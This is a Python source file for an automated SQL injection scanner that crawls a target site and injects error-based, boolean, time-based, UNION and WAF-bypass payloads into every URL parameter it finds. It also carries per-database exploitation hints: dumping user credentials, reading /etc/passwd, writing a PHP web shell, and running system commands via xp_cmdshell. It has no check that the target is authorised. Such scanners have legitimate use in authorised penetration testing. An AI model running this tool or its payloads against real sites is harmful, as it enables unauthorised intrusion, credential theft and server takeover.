"""
sqli_scanner.py — Ultra SQL Injection Scanner
Features: Error-based, Boolean-based, Time-based blind, Union-based,
          OOB SQLi, 10 DB fingerprints, WAF bypass, auto-exploitation hints
"""

import re
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings()

from ui.rich_ui import (
    console, info, warning, error, found, success, section_header, print_summary
)

TIMEOUT    = 15
DELAY      = 0.3
TIME_DELAY = 5  # seconds for time-based

# ── Error signatures per DB ───────────────────────────────────────────────────
DB_ERRORS = {
    "MySQL":      [r"you have an error in your sql syntax", r"warning: mysql", r"mysql_fetch",
                   r"mysql_num_rows", r"supplied argument is not a valid mysql", r"com\.mysql\.jdbc"],
    "PostgreSQL": [r"pg_query\(\)", r"pg_exec\(\)", r"postgresql.*error", r"warning.*pg_",
                   r"valid postgresql result", r"npgsql\.", r"pgsql"],
    "MSSQL":      [r"driver.*sql server", r"ole db.*sql server", r"sql server.*driver",
                   r"unclosed quotation mark", r"microsoft.*database.*engine", r"\[sql server\]"],
    "Oracle":     [r"ora-\d{5}", r"oracle.*driver", r"warning.*oci_", r"quoted string not properly terminated"],
    "SQLite":     [r"sqlite_.*error", r"sqlite3\.operationalerror", r"sqlite error"],
    "MongoDB":    [r"MongoError", r"mongodb.*exception", r"bson.*invalid"],
    "DB2":        [r"com\.ibm\.db2", r"db2 sql error", r"sqlstate"],
    "Sybase":     [r"sybase.*error", r"com\.sybase\.jdbc"],
    "Informix":   [r"informix.*error", r"com\.informix\.jdbc"],
    "MariaDB":    [r"mariadb.*error", r"warning.*mariadb"],
}

# ── Payloads ──────────────────────────────────────────────────────────────────
ERROR_PAYLOADS = [
    "'", '"', "''", '""', "`", "\\", "'--", "'#", "' OR '1'='1",
    "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*", "1' OR '1'='1",
    "admin'--", "' UNION SELECT NULL--", "'; SELECT SLEEP(0)--",
    "1 AND 1=1", "1 AND 1=2", "1' AND '1'='1", "1' AND '1'='2",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
    "' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--",
]

BOOLEAN_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1--", "' AND 1=2--"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("' OR 'x'='x", "' OR 'x'='y"),
    ("1' AND '1'='1'--", "1' AND '1'='2'--"),
]

TIME_PAYLOADS = {
    "MySQL":      [f"' AND SLEEP({TIME_DELAY})--", f"1' AND SLEEP({TIME_DELAY})--",
                   f"'; SELECT SLEEP({TIME_DELAY})--"],
    "PostgreSQL": [f"'; SELECT pg_sleep({TIME_DELAY})--", f"' AND 1=(SELECT 1 FROM pg_sleep({TIME_DELAY}))--"],
    "MSSQL":      [f"'; WAITFOR DELAY '0:0:{TIME_DELAY}'--", f"1; WAITFOR DELAY '0:0:{TIME_DELAY}'--"],
    "Oracle":     [f"' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{TIME_DELAY})--"],
    "Generic":    [f"' OR SLEEP({TIME_DELAY})--", f"1; SLEEP({TIME_DELAY})--"],
}

UNION_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT 1--",
    "' UNION SELECT 1,2--",
    "' UNION SELECT 1,2,3--",
    "' UNION ALL SELECT NULL--",
    "' UNION ALL SELECT NULL,NULL--",
    # Version extraction
    "' UNION SELECT @@version--",
    "' UNION SELECT version()--",
    "' UNION SELECT banner FROM v$version--",
]

WAF_BYPASS_PAYLOADS = [
    "' /*!OR*/ '1'='1",
    "' %09OR%09'1'='1",
    "' %0aOR%0a'1'='1",
    "'/**/OR/**/'1'='1",
    "' OORR '1'='1",
    "' ||'1'='1",
    "' %7c%7c'1'='1",
    "1' AND 0x31=0x31--",
    "' AND char(49)=char(49)--",
    "';EXEC(CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84))--",
]

EXPLOITATION_HINTS = {
    "MySQL": [
        "Extract DB: ' UNION SELECT database()--",
        "List tables: ' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--",
        "List columns: ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
        "Dump data: ' UNION SELECT username,password FROM users--",
        "Read file: ' UNION SELECT LOAD_FILE('/etc/passwd')--",
        "Write shell: ' UNION SELECT '' INTO OUTFILE '/var/www/shell.php'--",
    ],
    "PostgreSQL": [
        "Extract DB: ' UNION SELECT current_database()--",
        "List tables: ' UNION SELECT tablename FROM pg_tables--",
        "Read file: ' UNION SELECT pg_read_file('/etc/passwd')--",
        "RCE: '; COPY cmd_exec FROM PROGRAM 'id'--",
    ],
    "MSSQL": [
        "Extract DB: ' UNION SELECT DB_NAME()--",
        "List tables: ' UNION SELECT name FROM sys.tables--",
        "RCE: '; EXEC xp_cmdshell('whoami')--",
        "Enable xp_cmdshell: '; EXEC sp_configure 'xp_cmdshell',1--",
    ],
    "Oracle": [
        "Extract DB: ' UNION SELECT global_name FROM global_name--",
        "List tables: ' UNION SELECT table_name FROM all_tables--",
        "Dump users: ' UNION SELECT username,password FROM dba_users--",
    ],
}


def _session() -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
        "Accept":     "*/*",
    })
    return s


def _inject_param(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param] = [payload]
    new_query = urlencode({k: v[0] for k, v in params.items()})
    return urlunparse(parsed._replace(query=new_query))


def _detect_db_error(body: str) -> Optional[str]:
    body_lower = body.lower()
    for db, patterns in DB_ERRORS.items():
        if any(re.search(p, body_lower) for p in patterns):
            return db
    return None


def _get_baseline(url: str) -> Tuple[int, int, str]:
    """Get baseline response for comparison."""
    try:
        r = _session().get(url, timeout=TIMEOUT, verify=False)
        return r.status_code, len(r.text), r.text[:500]
    except Exception:
        return 200, 0, ""


def _test_error_based(url: str, param: str) -> Optional[Dict]:
    """Test error-based SQL injection."""
    for payload in ERROR_PAYLOADS:
        test_url = _inject_param(url, param, payload)
        try:
            r = _session().get(test_url, timeout=TIMEOUT, verify=False)
            db = _detect_db_error(r.text)
            if db:
                return {
                    "type":    "Error-Based SQLi",
                    "db":      db,
                    "url":     test_url,
                    "param":   param,
                    "payload": payload,
                    "severity":"CRITICAL",
                    "evidence": re.findall(
                        r"(error|warning|syntax|exception)[^<]{0,100}",
                        r.text[:2000], re.I
                    )[:2],
                }
        except Exception:
            pass
        time.sleep(DELAY)
    return None


def _test_boolean_based(url: str, param: str) -> Optional[Dict]:
    """Test boolean-based blind SQL injection."""
    base_status, base_len, base_body = _get_baseline(url)

    for true_payload, false_payload in BOOLEAN_PAYLOADS:
        try:
            # True condition
            r_true = _session().get(
                _inject_param(url, param, true_payload),
                timeout=TIMEOUT, verify=False
            )
            # False condition
            r_false = _session().get(
                _inject_param(url, param, false_payload),
                timeout=TIMEOUT, verify=False
            )

            true_len  = len(r_true.text)
            false_len = len(r_false.text)

            # Significant difference = boolean injection
            if abs(true_len - false_len) > 50:
                if true_len > false_len:
                    return {
                        "type":         "Boolean-Based Blind SQLi",
                        "db":           "Unknown",
                        "url":          _inject_param(url, param, true_payload),
                        "param":        param,
                        "payload_true": true_payload,
                        "payload_false":false_payload,
                        "diff":         abs(true_len - false_len),
                        "severity":     "CRITICAL",
                    }
        except Exception:
            pass
        time.sleep(DELAY)
    return None


def _test_time_based(url: str, param: str, db_hint: str = "Generic") -> Optional[Dict]:
    """Test time-based blind SQL injection."""
    payloads = TIME_PAYLOADS.get(db_hint, TIME_PAYLOADS["Generic"])
    payloads += TIME_PAYLOADS["Generic"]

    for payload in payloads[:5]:
        test_url = _inject_param(url, param, payload)
        try:
            start = time.time()
            r = _session().get(test_url, timeout=TIME_DELAY + 5, verify=False)
            elapsed = time.time() - start

            if elapsed >= TIME_DELAY - 0.5:
                return {
                    "type":    "Time-Based Blind SQLi",
                    "db":      db_hint,
                    "url":     test_url,
                    "param":   param,
                    "payload": payload,
                    "delay":   f"{elapsed:.1f}s",
                    "severity":"CRITICAL",
                }
        except Exception:
            pass

    return None


def _test_union_based(url: str, param: str) -> Optional[Dict]:
    """Test UNION-based SQL injection."""
    for payload in UNION_PAYLOADS:
        test_url = _inject_param(url, param, payload)
        try:
            r = _session().get(test_url, timeout=TIMEOUT, verify=False)
            body = r.text

            # Check for version strings in response
            for pattern in [
                r"\d+\.\d+\.\d+-\w+",  # MySQL version
                r"PostgreSQL \d+\.\d+",
                r"Microsoft SQL Server \d{4}",
                r"Oracle Database \d+",
            ]:
                m = re.search(pattern, body, re.I)
                if m:
                    return {
                        "type":    "Union-Based SQLi",
                        "db":      "Detected",
                        "url":     test_url,
                        "param":   param,
                        "payload": payload,
                        "version": m.group(0),
                        "severity":"CRITICAL",
                    }

            # Check for NULL pattern (union column count found)
            if "NULL" in payload and r.status_code == 200:
                base_status, base_len, _ = _get_baseline(url)
                if abs(len(body) - base_len) > 100:
                    return {
                        "type":    "Union-Based SQLi (possible)",
                        "db":      "Unknown",
                        "url":     test_url,
                        "param":   param,
                        "payload": payload,
                        "severity":"HIGH",
                    }
        except Exception:
            pass
        time.sleep(DELAY)
    return None


def _test_waf_bypass(url: str, param: str) -> Optional[Dict]:
    """Test WAF bypass payloads."""
    for payload in WAF_BYPASS_PAYLOADS:
        test_url = _inject_param(url, param, payload)
        try:
            r = _session().get(test_url, timeout=TIMEOUT, verify=False)
            db = _detect_db_error(r.text)
            if db:
                return {
                    "type":    "SQLi via WAF Bypass",
                    "db":      db,
                    "url":     test_url,
                    "param":   param,
                    "payload": payload,
                    "severity":"CRITICAL",
                }
        except Exception:
            pass
        time.sleep(DELAY)
    return None


def _get_urls_with_params(base_url: str) -> List[str]:
    """Crawl and find URLs with parameters."""
    urls = set()
    try:
        r = _session().get(base_url, timeout=TIMEOUT, verify=False)
        soup = BeautifulSoup(r.text, "html.parser")
        for a in soup.find_all("a", href=True):
            href = urljoin(base_url, a["href"])
            if "?" in href and base_url.split("/")[2] in href:
                urls.add(href)
        # Also check forms
        for form in soup.find_all("form"):
            action = urljoin(base_url, form.get("action", ""))
            if action:
                urls.add(action)
    except Exception:
        pass
    return list(urls)


def run_sqli_scanner(target: str) -> Dict:
    section_header("SQL Injection Scanner", "Ultra Error + Boolean + Time + Union | 10 DBs")
    info(f"Target: {target}")

    base_url = target if target.startswith("http") else f"https://{target}"

    # Discover URLs with params
    info("Discovering URLs with parameters...")
    urls = [base_url] + _get_urls_with_params(base_url)
    urls_with_params = [u for u in urls if "?" in u]
    info(f"Found {len(urls_with_params)} URLs with parameters")

    if not urls_with_params:
        warning("No parameterized URLs found — try providing a specific URL with params")
        return {}

    all_findings: List[Dict] = []
    lock = threading.Lock()

    for url in urls_with_params[:15]:
        params = list(parse_qs(urlparse(url).query).keys())
        if not params:
            continue

        info(f"Testing: {url[:70]}")
        info(f"  Parameters: {params}")

        for param in params:
            console.print(f"  [dim]→ Testing param: {param}[/dim]")

            # 1. Error-based
            r = _test_error_based(url, param)
            if r:
                db_found = r["db"]
                with lock:
                    all_findings.append(r)
                    found(f"[bold red][ERROR SQLi][/bold red]  {param}  DB: {db_found}")

                # Get exploitation hints
                hints = EXPLOITATION_HINTS.get(db_found, [])
                if hints:
                    console.print(f"  [bold yellow]Exploitation hints for {db_found}:[/bold yellow]")
                    for h in hints[:3]:
                        console.print(f"    [yellow]→[/yellow] {h}")
                continue

            # 2. Boolean-based
            r = _test_boolean_based(url, param)
            if r:
                with lock:
                    all_findings.append(r)
                    found(f"[bold red][BOOLEAN SQLi][/bold red]  {param}  diff={r['diff']} chars")
                continue

            # 3. Union-based
            r = _test_union_based(url, param)
            if r:
                with lock:
                    all_findings.append(r)
                    found(f"[bold red][UNION SQLi][/bold red]  {param}  {r.get('version','')}")
                continue

            # 4. Time-based
            info(f"  Time-based test (will take ~{TIME_DELAY}s)...")
            r = _test_time_based(url, param)
            if r:
                with lock:
                    all_findings.append(r)
                    found(f"[bold red][TIME SQLi][/bold red]  {param}  delay={r['delay']}")
                continue

            # 5. WAF bypass
            r = _test_waf_bypass(url, param)
            if r:
                with lock:
                    all_findings.append(r)
                    found(f"[bold red][WAF BYPASS SQLi][/bold red]  {param}")

    # Print results
    console.print(f"\n[bold cyan]━━━ SQL INJECTION FINDINGS ({len(all_findings)}) ━━━[/bold cyan]")
    for f in all_findings:
        console.print(f"\n  [bold red][{f['type']}][/bold red]")
        console.print(f"  URL:      {f.get('url','')[:80]}")
        console.print(f"  Param:    {f.get('param','')}")
        console.print(f"  DB:       {f.get('db','Unknown')}")
        console.print(f"  Payload:  [red]{f.get('payload','')[:60]}[/red]")
        if f.get("version"):
            console.print(f"  Version:  [red]{f['version']}[/red]")
        if f.get("evidence"):
            for ev in f["evidence"][:2]:
                console.print(f"  Evidence: [dim]{ev[:80]}[/dim]")

    print_summary("SQL Injection Scanner", {
        "URLs Tested":    len(urls_with_params[:15]),
        "Total Found":    len(all_findings),
        "Error-Based":    sum(1 for f in all_findings if "Error" in f["type"]),
        "Boolean-Based":  sum(1 for f in all_findings if "Boolean" in f["type"]),
        "Time-Based":     sum(1 for f in all_findings if "Time" in f["type"]),
        "Union-Based":    sum(1 for f in all_findings if "Union" in f["type"]),
    })

    return {"findings": all_findings, "total": len(all_findings)}
